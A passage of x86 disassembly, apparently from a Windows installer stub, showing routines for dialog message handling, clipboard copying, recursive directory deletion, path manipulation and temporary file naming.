  405037:	ff 15 60 72 40 00    	call   *0x407260
  40503d:	eb 06                	jmp    0x405045
  40503f:	89 1d 30 db 44 00    	mov    %ebx,0x44db30
  405045:	ff 35 28 db 44 00    	push   0x44db28
  40504b:	e8 a3 ed ff ff       	call   0x403df3
  405050:	68 ec 03 00 00       	push   $0x3ec
  405055:	ff 75 08             	push   0x8(%ebp)
  405058:	ff d7                	call   *%edi
  40505a:	68 00 00 30 75       	push   $0x75300000
  40505f:	8b f8                	mov    %eax,%edi
  405061:	53                   	push   %ebx
  405062:	68 01 04 00 00       	push   $0x401
  405067:	57                   	push   %edi
  405068:	ff d6                	call   *%esi
  40506a:	f6 05 78 1b 45 00 04 	testb  $0x4,0x451b78
  405071:	0f 84 ee 01 00 00    	je     0x405265
  405077:	ff 75 10             	push   0x10(%ebp)
  40507a:	53                   	push   %ebx
  40507b:	68 09 04 00 00       	push   $0x409
  405080:	57                   	push   %edi
  405081:	ff d6                	call   *%esi
  405083:	ff 75 0c             	push   0xc(%ebp)
  405086:	53                   	push   %ebx
  405087:	68 01 20 00 00       	push   $0x2001
  40508c:	57                   	push   %edi
  40508d:	ff d6                	call   *%esi
  40508f:	e9 d1 01 00 00       	jmp    0x405265
  405094:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  40509b:	75 28                	jne    0x4050c5
  40509d:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4050a0:	50                   	push   %eax
  4050a1:	53                   	push   %ebx
  4050a2:	68 ec 03 00 00       	push   $0x3ec
  4050a7:	ff 75 08             	push   0x8(%ebp)
  4050aa:	ff 15 2c 72 40 00    	call   *0x40722c
  4050b0:	50                   	push   %eax
  4050b1:	68 7c 4e 40 00       	push   $0x404e7c
  4050b6:	53                   	push   %ebx
  4050b7:	53                   	push   %ebx
  4050b8:	ff 15 c8 70 40 00    	call   *0x4070c8
  4050be:	50                   	push   %eax
  4050bf:	ff 15 ec 70 40 00    	call   *0x4070ec
  4050c5:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  4050cc:	8b 35 60 72 40 00    	mov    0x407260,%esi
  4050d2:	75 1c                	jne    0x4050f0
  4050d4:	66 81 7d 10 03 04    	cmpw   $0x403,0x10(%ebp)
  4050da:	75 36                	jne    0x405112
  4050dc:	53                   	push   %ebx
  4050dd:	ff 35 30 db 44 00    	push   0x44db30
  4050e3:	ff d6                	call   *%esi
  4050e5:	6a 08                	push   $0x8
  4050e7:	57                   	push   %edi
  4050e8:	ff d6                	call   *%esi
  4050ea:	57                   	push   %edi
  4050eb:	e8 03 ed ff ff       	call   0x403df3
  4050f0:	81 7d 0c 04 04 00 00 	cmpl   $0x404,0xc(%ebp)
  4050f7:	75 55                	jne    0x40514e
  4050f9:	39 1d 2c db 44 00    	cmp    %ebx,0x44db2c
  4050ff:	74 26                	je     0x405127
  405101:	6a 78                	push   $0x78
  405103:	c7 05 a8 57 43 00 02 	movl   $0x2,0x4357a8
  40510a:	00 00 00 
  40510d:	e8 85 ec ff ff       	call   0x403d97
  405112:	ff 75 14             	push   0x14(%ebp)
  405115:	ff 75 10             	push   0x10(%ebp)
  405118:	ff 75 0c             	push   0xc(%ebp)
  40511b:	e8 05 ed ff ff       	call   0x403e25
  405120:	5f                   	pop    %edi
  405121:	5e                   	pop    %esi
  405122:	5b                   	pop    %ebx
  405123:	c9                   	leave
  405124:	c2 10 00             	ret    $0x10
  405127:	6a 08                	push   $0x8
  405129:	ff 35 68 1b 45 00    	push   0x451b68
  40512f:	ff d6                	call   *%esi
  405131:	39 1d ec 1b 45 00    	cmp    %ebx,0x451bec
  405137:	75 0e                	jne    0x405147
  405139:	a1 b0 77 43 00       	mov    0x4377b0,%eax
  40513e:	53                   	push   %ebx
  40513f:	ff 70 34             	push   0x34(%eax)
  405142:	e8 63 fc ff ff       	call   0x404daa
  405147:	6a 01                	push   $0x1
  405149:	e8 49 ec ff ff       	call   0x403d97
  40514e:	83 7d 0c 7b          	cmpl   $0x7b,0xc(%ebp)
  405152:	75 be                	jne    0x405112
  405154:	39 7d 10             	cmp    %edi,0x10(%ebp)
  405157:	75 b9                	jne    0x405112
  405159:	53                   	push   %ebx
  40515a:	53                   	push   %ebx
  40515b:	68 04 10 00 00       	push   $0x1004
  405160:	57                   	push   %edi
  405161:	ff 15 44 72 40 00    	call   *0x407244
  405167:	3b c3                	cmp    %ebx,%eax
  405169:	89 45 0c             	mov    %eax,0xc(%ebp)
  40516c:	0f 8e f3 00 00 00    	jle    0x405265
  405172:	ff 15 c8 71 40 00    	call   *0x4071c8
  405178:	6a e1                	push   $0xffffffe1
  40517a:	53                   	push   %ebx
  40517b:	8b f0                	mov    %eax,%esi
  40517d:	e8 ac 08 00 00       	call   0x405a2e
  405182:	50                   	push   %eax
  405183:	6a 01                	push   $0x1
  405185:	53                   	push   %ebx
  405186:	56                   	push   %esi
  405187:	ff 15 c4 71 40 00    	call   *0x4071c4
  40518d:	8b 45 14             	mov    0x14(%ebp),%eax
  405190:	83 f8 ff             	cmp    $0xffffffff,%eax
  405193:	75 13                	jne    0x4051a8
  405195:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405198:	50                   	push   %eax
  405199:	57                   	push   %edi
  40519a:	ff 15 74 71 40 00    	call   *0x407174
  4051a0:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4051a3:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4051a6:	eb 09                	jmp    0x4051b1
  4051a8:	0f bf c8             	movswl %ax,%ecx
  4051ab:	c1 e8 10             	shr    $0x10,%eax
  4051ae:	0f bf c0             	movswl %ax,%eax
  4051b1:	53                   	push   %ebx
  4051b2:	ff 75 08             	push   0x8(%ebp)
  4051b5:	53                   	push   %ebx
  4051b6:	50                   	push   %eax
  4051b7:	51                   	push   %ecx
  4051b8:	68 80 01 00 00       	push   $0x180
  4051bd:	56                   	push   %esi
  4051be:	ff 15 c0 71 40 00    	call   *0x4071c0
  4051c4:	33 f6                	xor    %esi,%esi
  4051c6:	46                   	inc    %esi
  4051c7:	3b c6                	cmp    %esi,%eax
  4051c9:	0f 85 96 00 00 00    	jne    0x405265
  4051cf:	8b 45 0c             	mov    0xc(%ebp),%eax
  4051d2:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  4051d5:	c7 45 d4 e0 b7 43 00 	movl   $0x43b7e0,-0x2c(%ebp)
  4051dc:	c7 45 d8 ff 7f 00 00 	movl   $0x7fff,-0x28(%ebp)
  4051e3:	89 45 08             	mov    %eax,0x8(%ebp)
  4051e6:	bf 2d 10 00 00       	mov    $0x102d,%edi
  4051eb:	ff 4d 08             	decl   0x8(%ebp)
  4051ee:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4051f1:	50                   	push   %eax
  4051f2:	ff 75 08             	push   0x8(%ebp)
  4051f5:	57                   	push   %edi
  4051f6:	ff 75 fc             	push   -0x4(%ebp)
  4051f9:	ff 15 44 72 40 00    	call   *0x407244
  4051ff:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  405202:	8d 74 06 02          	lea    0x2(%esi,%eax,1),%esi
  405206:	75 e3                	jne    0x4051eb
  405208:	53                   	push   %ebx
  405209:	ff 15 20 72 40 00    	call   *0x407220
  40520f:	ff 15 b8 71 40 00    	call   *0x4071b8
  405215:	56                   	push   %esi
  405216:	6a 42                	push   $0x42
  405218:	ff 15 00 71 40 00    	call   *0x407100
  40521e:	50                   	push   %eax
  40521f:	89 45 08             	mov    %eax,0x8(%ebp)
  405222:	ff 15 c4 70 40 00    	call   *0x4070c4
  405228:	8b f0                	mov    %eax,%esi
  40522a:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40522d:	89 75 d4             	mov    %esi,-0x2c(%ebp)
  405230:	50                   	push   %eax
  405231:	53                   	push   %ebx
  405232:	57                   	push   %edi
  405233:	ff 75 fc             	push   -0x4(%ebp)
  405236:	ff 15 44 72 40 00    	call   *0x407244
  40523c:	03 f0                	add    %eax,%esi
  40523e:	66 c7 06 0d 0a       	movw   $0xa0d,(%esi)
  405243:	46                   	inc    %esi
  405244:	46                   	inc    %esi
  405245:	43                   	inc    %ebx
  405246:	3b 5d 0c             	cmp    0xc(%ebp),%ebx
  405249:	7c df                	jl     0x40522a
  40524b:	ff 75 08             	push   0x8(%ebp)
  40524e:	ff 15 c0 70 40 00    	call   *0x4070c0
  405254:	ff 75 08             	push   0x8(%ebp)
  405257:	6a 01                	push   $0x1
  405259:	ff 15 b4 71 40 00    	call   *0x4071b4
  40525f:	ff 15 b0 71 40 00    	call   *0x4071b0
  405265:	33 c0                	xor    %eax,%eax
  405267:	e9 b4 fe ff ff       	jmp    0x405120
  40526c:	55                   	push   %ebp
  40526d:	8b ec                	mov    %esp,%ebp
  40526f:	83 ec 10             	sub    $0x10,%esp
  405272:	8d 45 f0             	lea    -0x10(%ebp),%eax
  405275:	c7 05 e8 7f 44 00 44 	movl   $0x44,0x447fe8
  40527c:	00 00 00 
  40527f:	50                   	push   %eax
  405280:	33 c0                	xor    %eax,%eax
  405282:	68 e8 7f 44 00       	push   $0x447fe8
  405287:	50                   	push   %eax
  405288:	50                   	push   %eax
  405289:	50                   	push   %eax
  40528a:	50                   	push   %eax
  40528b:	50                   	push   %eax
  40528c:	50                   	push   %eax
  40528d:	ff 75 08             	push   0x8(%ebp)
  405290:	50                   	push   %eax
  405291:	ff 15 cc 70 40 00    	call   *0x4070cc
  405297:	85 c0                	test   %eax,%eax
  405299:	74 0c                	je     0x4052a7
  40529b:	ff 75 f4             	push   -0xc(%ebp)
  40529e:	ff 15 ec 70 40 00    	call   *0x4070ec
  4052a4:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4052a7:	c9                   	leave
  4052a8:	c2 04 00             	ret    $0x4
  4052ab:	ff 25 d0 71 40 00    	jmp    *0x4071d0
  4052b1:	68 00 20 00 00       	push   $0x2000
  4052b6:	ff 74 24 0c          	push   0xc(%esp)
  4052ba:	ff 74 24 0c          	push   0xc(%esp)
  4052be:	ff 35 38 db 44 00    	push   0x44db38
  4052c4:	ff 15 d4 71 40 00    	call   *0x4071d4
  4052ca:	c2 08 00             	ret    $0x8
  4052cd:	8b 44 24 08          	mov    0x8(%esp),%eax
  4052d1:	8b c8                	mov    %eax,%ecx
  4052d3:	81 e1 ff ff 1f 00    	and    $0x1fffff,%ecx
  4052d9:	83 3d 00 1c 45 00 00 	cmpl   $0x0,0x451c00
  4052e0:	74 05                	je     0x4052e7
  4052e2:	c1 e8 15             	shr    $0x15,%eax
  4052e5:	75 47                	jne    0x40532e
  4052e7:	83 3d 08 1c 45 00 00 	cmpl   $0x0,0x451c08
  4052ee:	74 06                	je     0x4052f6
  4052f0:	81 f1 00 00 18 00    	xor    $0x180000,%ecx
  4052f6:	a1 68 1b 45 00       	mov    0x451b68,%eax
  4052fb:	68 d8 91 40 00       	push   $0x4091d8
  405300:	a3 dc 91 40 00       	mov    %eax,0x4091dc
  405305:	a1 60 1b 45 00       	mov    0x451b60,%eax
  40530a:	a3 e0 91 40 00       	mov    %eax,0x4091e0
  40530f:	8b 44 24 08          	mov    0x8(%esp),%eax
  405313:	a3 e4 91 40 00       	mov    %eax,0x4091e4
  405318:	c7 05 e8 91 40 00 60 	movl   $0x44db60,0x4091e8
  40531f:	db 44 00 
  405322:	89 0d ec 91 40 00    	mov    %ecx,0x4091ec
  405328:	ff 15 d8 71 40 00    	call   *0x4071d8
  40532e:	c2 08 00             	ret    $0x8
  405331:	55                   	push   %ebp
  405332:	8b ec                	mov    %esp,%ebp
  405334:	81 ec 48 01 00 00    	sub    $0x148,%esp
  40533a:	56                   	push   %esi
  40533b:	57                   	push   %edi
  40533c:	8b 7d 08             	mov    0x8(%ebp),%edi
  40533f:	57                   	push   %edi
  405340:	e8 9b 02 00 00       	call   0x4055e0
  405345:	f6 45 0c 08          	testb  $0x8,0xc(%ebp)
  405349:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40534c:	74 17                	je     0x405365
  40534e:	57                   	push   %edi
  40534f:	ff 15 44 71 40 00    	call   *0x407144
  405355:	f7 d8                	neg    %eax
  405357:	1b c0                	sbb    %eax,%eax
  405359:	40                   	inc    %eax
  40535a:	01 05 e8 1b 45 00    	add    %eax,0x451be8
  405360:	e9 94 01 00 00       	jmp    0x4054f9
  405365:	53                   	push   %ebx
  405366:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  405369:	83 e3 01             	and    $0x1,%ebx
  40536c:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40536f:	74 12                	je     0x405383
  405371:	85 c0                	test   %eax,%eax
  405373:	0f 84 2b 01 00 00    	je     0x4054a4
  405379:	f6 45 0c 02          	testb  $0x2,0xc(%ebp)
  40537d:	0f 84 21 01 00 00    	je     0x4054a4
  405383:	be e8 37 44 00       	mov    $0x4437e8,%esi
  405388:	57                   	push   %edi
  405389:	56                   	push   %esi
  40538a:	e8 7d 06 00 00       	call   0x405a0c
  40538f:	85 db                	test   %ebx,%ebx
  405391:	74 0d                	je     0x4053a0
  405393:	68 28 93 40 00       	push   $0x409328
  405398:	56                   	push   %esi
  405399:	e8 8a 06 00 00       	call   0x405a28
  40539e:	eb 06                	jmp    0x4053a6
  4053a0:	57                   	push   %edi
  4053a1:	e8 a0 01 00 00       	call   0x405546
  4053a6:	80 3f 00             	cmpb   $0x0,(%edi)
  4053a9:	75 09                	jne    0x4053b4
  4053ab:	80 3d e8 37 44 00 5c 	cmpb   $0x5c,0x4437e8
  4053b2:	75 0b                	jne    0x4053bf
  4053b4:	68 10 90 40 00       	push   $0x409010
  4053b9:	57                   	push   %edi
  4053ba:	e8 69 06 00 00       	call   0x405a28
  4053bf:	57                   	push   %edi
  4053c0:	e8 5d 06 00 00       	call   0x405a22
  4053c5:	8b d8                	mov    %eax,%ebx
  4053c7:	8d 85 b8 fe ff ff    	lea    -0x148(%ebp),%eax
  4053cd:	50                   	push   %eax
  4053ce:	56                   	push   %esi
  4053cf:	03 df                	add    %edi,%ebx
  4053d1:	ff 15 40 71 40 00    	call   *0x407140
  4053d7:	83 f8 ff             	cmp    $0xffffffff,%eax
  4053da:	89 45 08             	mov    %eax,0x8(%ebp)
  4053dd:	0f 84 b7 00 00 00    	je     0x40549a
  4053e3:	8d 85 e4 fe ff ff    	lea    -0x11c(%ebp),%eax
  4053e9:	6a 3f                	push   $0x3f
  4053eb:	50                   	push   %eax
  4053ec:	8d b5 e4 fe ff ff    	lea    -0x11c(%ebp),%esi
  4053f2:	e8 33 01 00 00       	call   0x40552a
  4053f7:	80 38 00             	cmpb   $0x0,(%eax)
  4053fa:	74 09                	je     0x405405
  4053fc:	80 7d e8 00          	cmpb   $0x0,-0x18(%ebp)
  405400:	74 03                	je     0x405405
  405402:	8d 75 e8             	lea    -0x18(%ebp),%esi
  405405:	80 3e 2e             	cmpb   $0x2e,(%esi)
  405408:	75 11                	jne    0x40541b
  40540a:	8a 46 01             	mov    0x1(%esi),%al
  40540d:	84 c0                	test   %al,%al
  40540f:	74 68                	je     0x405479
  405411:	3c 2e                	cmp    $0x2e,%al
  405413:	75 06                	jne    0x40541b
  405415:	80 7e 02 00          	cmpb   $0x0,0x2(%esi)
  405419:	74 5e                	je     0x405479
  40541b:	56                   	push   %esi
  40541c:	53                   	push   %ebx
  40541d:	e8 ea 05 00 00       	call   0x405a0c
  405422:	f6 85 b8 fe ff ff 10 	testb  $0x10,-0x148(%ebp)
  405429:	74 15                	je     0x405440
  40542b:	8b 45 0c             	mov    0xc(%ebp),%eax
  40542e:	83 e0 03             	and    $0x3,%eax
  405431:	3c 03                	cmp    $0x3,%al
  405433:	75 44                	jne    0x405479
  405435:	ff 75 0c             	push   0xc(%ebp)
  405438:	57                   	push   %edi
  405439:	e8 f3 fe ff ff       	call   0x405331
  40543e:	eb 39                	jmp    0x405479
  405440:	57                   	push   %edi
  405441:	e8 7e 02 00 00       	call   0x4056c4
  405446:	57                   	push   %edi
  405447:	ff 15 44 71 40 00    	call   *0x407144
  40544d:	85 c0                	test   %eax,%eax
  40544f:	75 20                	jne    0x405471
  405451:	f6 45 0c 04          	testb  $0x4,0xc(%ebp)
  405455:	74 12                	je     0x405469
  405457:	57                   	push   %edi
  405458:	6a f1                	push   $0xfffffff1
  40545a:	e8 4b f9 ff ff       	call   0x404daa
  40545f:	6a 00                	push   $0x0
  405461:	57                   	push   %edi
  405462:	e8 f3 02 00 00       	call   0x40575a
  405467:	eb 10                	jmp    0x405479
  405469:	ff 05 e8 1b 45 00    	incl   0x451be8
  40546f:	eb 08                	jmp    0x405479
  405471:	57                   	push   %edi
  405472:	6a f2                	push   $0xfffffff2
  405474:	e8 31 f9 ff ff       	call   0x404daa
  405479:	8d 85 b8 fe ff ff    	lea    -0x148(%ebp),%eax
  40547f:	50                   	push   %eax
  405480:	ff 75 08             	push   0x8(%ebp)
  405483:	ff 15 3c 71 40 00    	call   *0x40713c
  405489:	85 c0                	test   %eax,%eax
  40548b:	0f 85 52 ff ff ff    	jne    0x4053e3
  405491:	ff 75 08             	push   0x8(%ebp)
  405494:	ff 15 38 71 40 00    	call   *0x407138
  40549a:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40549e:	74 04                	je     0x4054a4
  4054a0:	80 63 ff 00          	andb   $0x0,-0x1(%ebx)
  4054a4:	33 f6                	xor    %esi,%esi
  4054a6:	5b                   	pop    %ebx
  4054a7:	39 75 fc             	cmp    %esi,-0x4(%ebp)
  4054aa:	74 4d                	je     0x4054f9
  4054ac:	39 75 f8             	cmp    %esi,-0x8(%ebp)
  4054af:	75 08                	jne    0x4054b9
  4054b1:	ff 05 e8 1b 45 00    	incl   0x451be8
  4054b7:	eb 40                	jmp    0x4054f9
  4054b9:	57                   	push   %edi
  4054ba:	e8 48 08 00 00       	call   0x405d07
  4054bf:	85 c0                	test   %eax,%eax
  4054c1:	74 36                	je     0x4054f9
  4054c3:	57                   	push   %edi
  4054c4:	e8 36 00 00 00       	call   0x4054ff
  4054c9:	57                   	push   %edi
  4054ca:	e8 f5 01 00 00       	call   0x4056c4
  4054cf:	57                   	push   %edi
  4054d0:	ff 15 d0 70 40 00    	call   *0x4070d0
  4054d6:	85 c0                	test   %eax,%eax
  4054d8:	75 17                	jne    0x4054f1
  4054da:	f6 45 0c 04          	testb  $0x4,0xc(%ebp)
  4054de:	74 d1                	je     0x4054b1
  4054e0:	57                   	push   %edi
  4054e1:	6a f1                	push   $0xfffffff1
  4054e3:	e8 c2 f8 ff ff       	call   0x404daa
  4054e8:	56                   	push   %esi
  4054e9:	57                   	push   %edi
  4054ea:	e8 6b 02 00 00       	call   0x40575a
  4054ef:	eb 08                	jmp    0x4054f9
  4054f1:	57                   	push   %edi
  4054f2:	6a e5                	push   $0xffffffe5
  4054f4:	e8 b1 f8 ff ff       	call   0x404daa
  4054f9:	5f                   	pop    %edi
  4054fa:	5e                   	pop    %esi
  4054fb:	c9                   	leave
  4054fc:	c2 08 00             	ret    $0x8
  4054ff:	56                   	push   %esi
  405500:	8b 74 24 08          	mov    0x8(%esp),%esi
  405504:	56                   	push   %esi
  405505:	e8 18 05 00 00       	call   0x405a22
  40550a:	03 c6                	add    %esi,%eax
  40550c:	50                   	push   %eax
  40550d:	56                   	push   %esi
  40550e:	ff 15 dc 71 40 00    	call   *0x4071dc
  405514:	80 38 5c             	cmpb   $0x5c,(%eax)
  405517:	74 0b                	je     0x405524
  405519:	68 10 90 40 00       	push   $0x409010
  40551e:	56                   	push   %esi
  40551f:	e8 04 05 00 00       	call   0x405a28
  405524:	8b c6                	mov    %esi,%eax
  405526:	5e                   	pop    %esi
  405527:	c2 04 00             	ret    $0x4
  40552a:	8b 44 24 04          	mov    0x4(%esp),%eax
  40552e:	eb 0d                	jmp    0x40553d
  405530:	3a 4c 24 08          	cmp    0x8(%esp),%cl
  405534:	74 0d                	je     0x405543
  405536:	50                   	push   %eax
  405537:	ff 15 1c 72 40 00    	call   *0x40721c
  40553d:	8a 08                	mov    (%eax),%cl
  40553f:	84 c9                	test   %cl,%cl
  405541:	75 ed                	jne    0x405530
  405543:	c2 08 00             	ret    $0x8
  405546:	56                   	push   %esi
  405547:	8b 74 24 08          	mov    0x8(%esp),%esi
  40554b:	56                   	push   %esi
  40554c:	e8 d1 04 00 00       	call   0x405a22
  405551:	03 c6                	add    %esi,%eax
  405553:	80 38 5c             	cmpb   $0x5c,(%eax)
  405556:	74 0c                	je     0x405564
  405558:	50                   	push   %eax
  405559:	56                   	push   %esi
  40555a:	ff 15 dc 71 40 00    	call   *0x4071dc
  405560:	3b c6                	cmp    %esi,%eax
  405562:	77 ef                	ja     0x405553
  405564:	80 20 00             	andb   $0x0,(%eax)
  405567:	40                   	inc    %eax
  405568:	5e                   	pop    %esi
  405569:	c2 04 00             	ret    $0x4
  40556c:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  405570:	8a 01                	mov    (%ecx),%al
  405572:	0c 20                	or     $0x20,%al
  405574:	66 81 39 5c 5c       	cmpw   $0x5c5c,(%ecx)
  405579:	74 12                	je     0x40558d
  40557b:	3c 61                	cmp    $0x61,%al
  40557d:	7c 0a                	jl     0x405589
  40557f:	3c 7a                	cmp    $0x7a,%al
  405581:	7f 06                	jg     0x405589
  405583:	80 79 01 3a          	cmpb   $0x3a,0x1(%ecx)
  405587:	74 04                	je     0x40558d
  405589:	33 c0                	xor    %eax,%eax
  40558b:	eb 03                	jmp    0x405590
  40558d:	33 c0                	xor    %eax,%eax
  40558f:	40                   	inc    %eax
  405590:	c2 04 00             	ret    $0x4
  405593:	53                   	push   %ebx
  405594:	56                   	push   %esi
  405595:	8b 35 1c 72 40 00    	mov    0x40721c,%esi
  40559b:	57                   	push   %edi
  40559c:	8b 7c 24 10          	mov    0x10(%esp),%edi
  4055a0:	57                   	push   %edi
  4055a1:	ff d6                	call   *%esi
  4055a3:	8b d8                	mov    %eax,%ebx
  4055a5:	53                   	push   %ebx
  4055a6:	ff d6                	call   *%esi
  4055a8:	80 3f 00             	cmpb   $0x0,(%edi)
  4055ab:	74 0c                	je     0x4055b9
  4055ad:	66 81 3b 3a 5c       	cmpw   $0x5c3a,(%ebx)
  4055b2:	75 05                	jne    0x4055b9
  4055b4:	50                   	push   %eax
  4055b5:	ff d6                	call   *%esi
  4055b7:	eb 21                	jmp    0x4055da
  4055b9:	66 81 3f 5c 5c       	cmpw   $0x5c5c,(%edi)
  4055be:	75 18                	jne    0x4055d8
  4055c0:	6a 02                	push   $0x2
  4055c2:	5e                   	pop    %esi
  4055c3:	6a 5c                	push   $0x5c
  4055c5:	50                   	push   %eax
  4055c6:	4e                   	dec    %esi
  4055c7:	e8 5e ff ff ff       	call   0x40552a
  4055cc:	80 38 00             	cmpb   $0x0,(%eax)
  4055cf:	74 07                	je     0x4055d8
  4055d1:	40                   	inc    %eax
  4055d2:	85 f6                	test   %esi,%esi
  4055d4:	75 ed                	jne    0x4055c3
  4055d6:	eb 02                	jmp    0x4055da
  4055d8:	33 c0                	xor    %eax,%eax
  4055da:	5f                   	pop    %edi
  4055db:	5e                   	pop    %esi
  4055dc:	5b                   	pop    %ebx
  4055dd:	c2 04 00             	ret    $0x4
  4055e0:	56                   	push   %esi
  4055e1:	57                   	push   %edi
  4055e2:	ff 74 24 0c          	push   0xc(%esp)
  4055e6:	be e8 57 44 00       	mov    $0x4457e8,%esi
  4055eb:	56                   	push   %esi
  4055ec:	e8 1b 04 00 00       	call   0x405a0c
  4055f1:	56                   	push   %esi
  4055f2:	e8 9c ff ff ff       	call   0x405593
  4055f7:	8b f8                	mov    %eax,%edi
  4055f9:	85 ff                	test   %edi,%edi
  4055fb:	75 04                	jne    0x405601
  4055fd:	33 c0                	xor    %eax,%eax
  4055ff:	eb 52                	jmp    0x405653
  405601:	57                   	push   %edi
  405602:	e8 67 06 00 00       	call   0x405c6e
  405607:	f6 05 78 1b 45 00 80 	testb  $0x80,0x451b78
  40560e:	74 0a                	je     0x40561a
  405610:	8a 07                	mov    (%edi),%al
  405612:	84 c0                	test   %al,%al
  405614:	74 e7                	je     0x4055fd
  405616:	3c 5c                	cmp    $0x5c,%al
  405618:	74 e3                	je     0x4055fd
  40561a:	2b fe                	sub    %esi,%edi
  40561c:	eb 14                	jmp    0x405632
  40561e:	e8 e4 06 00 00       	call   0x405d07
  405623:	85 c0                	test   %eax,%eax
  405625:	74 05                	je     0x40562c
  405627:	f6 00 10             	testb  $0x10,(%eax)
  40562a:	74 d1                	je     0x4055fd
  40562c:	56                   	push   %esi
  40562d:	e8 14 ff ff ff       	call   0x405546
  405632:	56                   	push   %esi
  405633:	e8 ea 03 00 00       	call   0x405a22
  405638:	3b c7                	cmp    %edi,%eax
  40563a:	56                   	push   %esi
  40563b:	7f e1                	jg     0x40561e
  40563d:	e8 bd fe ff ff       	call   0x4054ff
  405642:	56                   	push   %esi
  405643:	ff 15 78 70 40 00    	call   *0x407078
  405649:	33 c9                	xor    %ecx,%ecx
  40564b:	83 f8 ff             	cmp    $0xffffffff,%eax
  40564e:	0f 95 c1             	setne  %cl
  405651:	8b c1                	mov    %ecx,%eax
  405653:	5f                   	pop    %edi
  405654:	5e                   	pop    %esi
  405655:	c2 04 00             	ret    $0x4
  405658:	53                   	push   %ebx
  405659:	56                   	push   %esi
  40565a:	57                   	push   %edi
  40565b:	ff 74 24 14          	push   0x14(%esp)
  40565f:	e8 be 03 00 00       	call   0x405a22
  405664:	8b f8                	mov    %eax,%edi
  405666:	8b 74 24 10          	mov    0x10(%esp),%esi
  40566a:	eb 22                	jmp    0x40568e
  40566c:	ff 74 24 14          	push   0x14(%esp)
  405670:	8a 1c 37             	mov    (%edi,%esi,1),%bl
  405673:	80 24 37 00          	andb   $0x0,(%edi,%esi,1)
  405677:	56                   	push   %esi
  405678:	ff 15 f0 70 40 00    	call   *0x4070f0
  40567e:	85 c0                	test   %eax,%eax
  405680:	88 1c 37             	mov    %bl,(%edi,%esi,1)
  405683:	74 1b                	je     0x4056a0
  405685:	56                   	push   %esi
  405686:	ff 15 1c 72 40 00    	call   *0x40721c
  40568c:	8b f0                	mov    %eax,%esi
  40568e:	56                   	push   %esi
  40568f:	e8 8e 03 00 00       	call   0x405a22
  405694:	3b c7                	cmp    %edi,%eax
  405696:	7d d4                	jge    0x40566c
  405698:	33 c0                	xor    %eax,%eax
  40569a:	5f                   	pop    %edi
  40569b:	5e                   	pop    %esi
  40569c:	5b                   	pop    %ebx
  40569d:	c2 08 00             	ret    $0x8
  4056a0:	8b c6                	mov    %esi,%eax
  4056a2:	eb f6                	jmp    0x40569a
  4056a4:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4056a8:	56                   	push   %esi
  4056a9:	8b 74 24 10          	mov    0x10(%esp),%esi
  4056ad:	85 f6                	test   %esi,%esi
  4056af:	7e 0f                	jle    0x4056c0
  4056b1:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4056b5:	2b c1                	sub    %ecx,%eax
  4056b7:	8a 14 08             	mov    (%eax,%ecx,1),%dl
  4056ba:	88 11                	mov    %dl,(%ecx)
  4056bc:	41                   	inc    %ecx
  4056bd:	4e                   	dec    %esi
  4056be:	75 f7                	jne    0x4056b7
  4056c0:	5e                   	pop    %esi
  4056c1:	c2 0c 00             	ret    $0xc
  4056c4:	ff 74 24 04          	push   0x4(%esp)
  4056c8:	ff 15 78 70 40 00    	call   *0x407078
  4056ce:	83 f8 ff             	cmp    $0xffffffff,%eax
  4056d1:	74 0d                	je     0x4056e0
  4056d3:	24 fe                	and    $0xfe,%al
  4056d5:	50                   	push   %eax
  4056d6:	ff 74 24 08          	push   0x8(%esp)
  4056da:	ff 15 84 70 40 00    	call   *0x407084
  4056e0:	c2 04 00             	ret    $0x4
  4056e3:	ff 74 24 04          	push   0x4(%esp)
  4056e7:	ff 15 78 70 40 00    	call   *0x407078
  4056ed:	8b c8                	mov    %eax,%ecx
  4056ef:	6a 00                	push   $0x0
  4056f1:	41                   	inc    %ecx
  4056f2:	f7 d9                	neg    %ecx
  4056f4:	1b c9                	sbb    %ecx,%ecx
  4056f6:	23 c8                	and    %eax,%ecx
  4056f8:	51                   	push   %ecx
  4056f9:	ff 74 24 14          	push   0x14(%esp)
  4056fd:	6a 00                	push   $0x0
  4056ff:	6a 01                	push   $0x1
  405701:	ff 74 24 1c          	push   0x1c(%esp)
  405705:	ff 74 24 1c          	push   0x1c(%esp)
  405709:	ff 15 d4 70 40 00    	call   *0x4070d4
  40570f:	c2 0c 00             	ret    $0xc
  405712:	55                   	push   %ebp
  405713:	8b ec                	mov    %esp,%ebp
  405715:	56                   	push   %esi
  405716:	8b 75 08             	mov    0x8(%ebp),%esi
  405719:	57                   	push   %edi
  40571a:	6a 64                	push   $0x64
  40571c:	5f                   	pop    %edi
  40571d:	4f                   	dec    %edi
  40571e:	c7 45 08 6e 73 61 00 	movl   $0x61736e,0x8(%ebp)
  405725:	ff 15 8c 70 40 00    	call   *0x40708c
  40572b:	6a 1a                	push   $0x1a
  40572d:	33 d2                	xor    %edx,%edx
  40572f:	59                   	pop    %ecx
  405730:	f7 f1                	div    %ecx
  405732:	56                   	push   %esi
  405733:	8d 45 08             	lea    0x8(%ebp),%eax
  405736:	6a 00                	push   $0x0
  405738:	50                   	push   %eax
  405739:	ff 75 0c             	push   0xc(%ebp)
  40573c:	00 55 0a             	add    %dl,0xa(%ebp)
  40573f:	ff 15 d8 70 40 00    	call   *0x4070d8
  405745:	85 c0                	test   %eax,%eax
  405747:	75 0d                	jne    0x405756
  405749:	85 ff                	test   %edi,%edi
  40574b:	75 d0                	jne    0x40571d
  40574d:	80 26 00             	andb   $0x0,(%esi)
  405750:	5f                   	pop    %edi
  405751:	5e                   	pop    %esi
  405752:	5d                   	pop    %ebp
